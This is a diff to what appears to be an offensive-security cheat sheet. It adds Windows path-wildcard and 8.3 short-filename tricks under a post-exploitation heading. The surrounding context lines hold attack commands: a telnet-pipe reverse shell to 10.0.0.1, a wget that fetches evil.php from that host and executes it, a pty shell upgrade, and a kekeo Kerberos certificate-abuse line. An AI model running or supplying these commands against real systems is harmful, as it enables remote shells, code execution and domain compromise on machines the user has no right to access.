@@ -144,8 +144,8 @@ b. kekeo # tgt::ask /pfx:<base64 pbx certificate> /user:<DC$ username> /domain:<
 ```
 
 # Post Exploitation
-
-## Linux
+<br/>
+# Linux
 Getting a shell:
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
@@ -180,6 +180,32 @@ telnet 10.0.0.1 <1st_port> | /bin/bash | telnet 10.0.0.1 <2nd_port>
 wget -O /tmp/bd.php http://10.0.0.1/evil.php && php -f /tmp/bd.php
  ```
 <br /><br />
+
+# Windows
+
+Directory name bypasses:
+```
+C:\>powershell C:\??*?\*3?\c?lc.?x? calc.exe
+C:\>powershell C:\*\*2\n??e*d.* notepad.exe
+C:\>powershell C:\*\*2\t?s*r.* taskmgr.exe
+```
+8.3 / Short filename notation:
+```
+dir /a:h /x
+for %A in (*.*) do @echo %~nsA %~nA
+
+C:\>dir /a:h /x
+                                        *
+13/10/2011  09:14 AM    <DIR>          DOCUME~1     Documents and Settings
+13/10/2011  09:05 AM    <DIR>          PROGRA~1     Program Files
+13/10/2011  09:05 AM    <DIR>          PROGRA~2     Program Files(x86)
+
+C:\>for %A in (*.*) do @echo %~nsA %~nA
+$WINDOWS $WINDOWS
+DOCUME~1 Documents and Settings
+NVIDIA~1 NVIDIA Corporation
+SYSTEM~1 System Volume Information
+```
 
  # Physical attacks
   
